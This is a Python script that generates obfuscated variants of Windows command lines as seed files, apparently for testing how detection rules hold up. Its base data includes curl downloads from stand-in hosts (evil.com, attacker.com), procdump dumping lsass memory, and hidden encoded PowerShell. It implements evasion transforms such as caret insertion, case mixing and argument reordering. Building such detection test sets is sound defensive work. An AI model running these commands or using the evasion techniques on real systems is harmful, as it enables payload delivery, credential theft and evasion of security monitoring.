"""
Generate enhanced seed collection with 5 evasion techniques
"""
import random
from pathlib import Path
from typing import List

class EnhancedSeedGenerator:
    def __init__(self):
        self.rng = random.Random(42)
    
    def apply_insertion(self, cmd: str) -> List[str]:
        """Technique 1: Insert characters between keywords"""
        variants = []
        
        keywords = ["create", "start", "stop", "delete", "bypass"]
        for kw in keywords:
            if kw in cmd.lower():
                # Insert quotes
                variants.append(cmd.replace(kw, f'/"{kw}"'))
                # Insert double quotes inside
                variants.append(cmd.replace(kw, f'/{kw[0]}""{kw[1:]}'))
                # Insert spaces
                variants.append(cmd.replace(kw, f'  {kw}'))
                break
        
        return variants
    
    def apply_substitution(self, cmd: str) -> List[str]:
        """Technique 2: Replace with equivalent forms"""
        variants = []
        
        substitutions = {
            " -ep ": " -ExecutionPolicy ",
            " -enc ": " -EncodedCommand ",
            " -w ": " -WindowStyle ",
            " -nop ": " -NoProfile ",
            " -c ": " -Command ",
            "bypass": "Bypass",
            "hidden": "Hidden",
        }
        
        for short, long in substitutions.items():
            if short in cmd:
                variants.append(cmd.replace(short, long))
        
        return variants
    
    def apply_omission(self, cmd: str) -> List[str]:
        """Technique 3: Remove non-essential parts"""
        variants = []
        
        # Remove .exe extensions
        if ".exe" in cmd:
            variants.append(cmd.replace(".exe", ""))
        
        # Remove path prefixes
        if "C:\\Windows\\System32\\" in cmd:
            variants.append(cmd.replace("C:\\Windows\\System32\\", ""))
        
        return variants
    
    def apply_reordering(self, cmd: str) -> List[str]:
        """Technique 4: Reorder arguments"""
        variants = []
        parts = cmd.split()
        
        if len(parts) < 3:
            return variants
        
        # Find flags (start with - or /)
        flags_idx = [i for i, p in enumerate(parts) if p.startswith('-') or p.startswith('/')]
        
        if flags_idx:
            # Move first flag to end
            new_parts = parts.copy()
            flag = new_parts.pop(flags_idx[0])
            new_parts.append(flag)
            variants.append(" ".join(new_parts))
        
        return variants
    
    def apply_recoding(self, cmd: str) -> List[str]:
        """Technique 5: Encode values"""
        variants = []
        
        # IP encoding (127.0.0.1 → 2130706433)
        if "127.0.0.1" in cmd:
            variants.append(cmd.replace("127.0.0.1", "2130706433"))
        
        # Hex encoding for ports
        if ":8080" in cmd:
            variants.append(cmd.replace(":8080", ":0x1F90"))
        
        return variants
    
    def apply_traditional_obfuscation(self, cmd: str) -> List[str]:
        """Traditional obfuscation techniques"""
        variants = []
        
        # Caret insertion
        for char in ["n", "e", "t", "s", "c"]:
            if char in cmd.lower():
                variants.append(cmd.replace(char, f"{char}^", 1))
                break
        
        # Case mixing
        variants.append(''.join(
            c.upper() if i % 2 == 0 else c.lower() 
            for i, c in enumerate(cmd)
        ))
        
        # Quote wrapping
        parts = cmd.split()
        if len(parts) > 0:
            parts[0] = f'"{parts[0]}"'
            variants.append(" ".join(parts))
        
        # Environment variables
        variants.append(cmd.replace("cmd", "%ComSpec%"))
        variants.append(cmd.replace("powershell", "%SystemRoot%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"))
        
        return variants
    
    def generate_variants(self, base_cmd: str, max_variants: int = 20) -> List[str]:
        """Generate all variants from base command"""
        all_variants = [base_cmd]  # Include original
        
        # Apply each technique
        all_variants.extend(self.apply_insertion(base_cmd))
        all_variants.extend(self.apply_substitution(base_cmd))
        all_variants.extend(self.apply_omission(base_cmd))
        all_variants.extend(self.apply_reordering(base_cmd))
        all_variants.extend(self.apply_recoding(base_cmd))
        all_variants.extend(self.apply_traditional_obfuscation(base_cmd))
        
        # Combine techniques (hybrid)
        hybrid = base_cmd
        if self.rng.random() > 0.5:
            insertion_variants = self.apply_insertion(hybrid)
            if insertion_variants:
                hybrid = self.rng.choice(insertion_variants)
        
        if self.rng.random() > 0.5:
            omission_variants = self.apply_omission(hybrid)
            if omission_variants:
                hybrid = self.rng.choice(omission_variants)
        
        all_variants.append(hybrid)
        
        # Remove duplicates and limit
        unique_variants = list(dict.fromkeys(all_variants))
        return unique_variants[:max_variants]

def generate_seeds_for_rule(rule_name: str, base_commands: List[str]) -> List[str]:
    """Generate enhanced seeds for a specific rule"""
    generator = EnhancedSeedGenerator()
    all_seeds = []
    
    for base_cmd in base_commands:
        variants = generator.generate_variants(base_cmd, max_variants=15)
        all_seeds.extend(variants)
    
    return all_seeds

def main():
    """Generate enhanced seeds for all rules"""
    
    # Define base commands per rule
    rule_bases = {
        "win_net_start_service": [
            "net.exe start Spooler",
            "net.exe start W32Time",
            "net start Schedule",
            "sc.exe start Spooler",
        ],
        "win_susp_schtask_creation": [
            "schtasks.exe /create /tn mytask /tr calc.exe",
            "schtasks /create /sc daily /tn backup",
        ],
        "win_susp_curl_download": [
            "curl -O http://evil.com/payload.exe",
            "curl.exe --output malware.dll http://attacker.com/malware.dll",
        ],
        "apt29_powershell_bypass": [
            "powershell.exe -ep bypass -c whoami",
            "powershell -ExecutionPolicy bypass -Command Get-Process",
            "powershell -nop -w hidden -enc base64here",
        ],
        "win_mal_adwind": [
            "cscript.exe script.vbs Retrive data",
            "wscript Retrive.vbs /silent",
        ],
        "win_pc_procdump": [
            "procdump.exe -ma lsass.exe dump.dmp",
            "procdump -ma -accepteula lsass",
        ],
        "win_vul_java_remote_dbg": [
            "java -agentlib:jdwp=transport=dt_socket,address=127.0.0.1:8000",
            "java -Xdebug -Xrunjdwp:transport=dt_socket,server=y,address=127.0.0.1:5005",
        ],
    }
    
    output_dir = Path(__file__).parent.parent / "conf" / "seeds"
    output_dir.mkdir(parents=True, exist_ok=True)
    
    for rule_name, base_cmds in rule_bases.items():
        seeds = generate_seeds_for_rule(rule_name, base_cmds)
        
        output_file = output_dir / f"{rule_name}.txt"
        
        with open(output_file, 'w', encoding='utf-8') as f:
            f.write(f"# Enhanced seeds for {rule_name}\n")
            f.write(f"# Generated with 5 evasion techniques + traditional obfuscation\n")
            f.write(f"# Total: {len(seeds)} variants\n\n")
            
            for seed in seeds:
                f.write(f"{seed}\n")
        
        print(f"[+] Generated {len(seeds)} seeds for {rule_name} → {output_file}")
    
    print(f"\n[✓] Enhanced seed collection saved to {output_dir}")
    print("[*] Run analyzer to verify coverage:")
    print("    python scripts/analyze_seeds.py")

if __name__ == "__main__":
    main()